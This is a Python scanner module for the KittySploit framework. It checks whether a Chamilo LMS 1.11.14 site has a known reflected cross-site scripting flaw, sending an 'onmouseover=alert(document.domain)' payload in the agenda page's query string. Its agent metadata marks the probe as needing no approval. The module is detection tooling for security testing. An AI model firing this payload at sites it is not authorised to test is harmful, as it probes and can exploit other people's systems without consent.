#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Chamilo LMS 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chamilo LMS 1.11.14 Cross-Site Scripting Detection',
        'description': 'Chamilo LMS 1.11.14 is vulnerable to cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'chamilo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.netsparker.com/web-applications-advisories/ns-21-001-cross-site-scripting-in-chamilo-lms/',
            'https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-45-2021-01-21-Moderate-impact-moderate-risk-XSS-vulnerability-in-agenda',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('agenda_js.php?type=xss" onmouseover=alert(document.domain)',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Chamilo LMS 1.11.14 Cross-Site Scripting detected",
                path='/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"',
            )
            return True
        return False

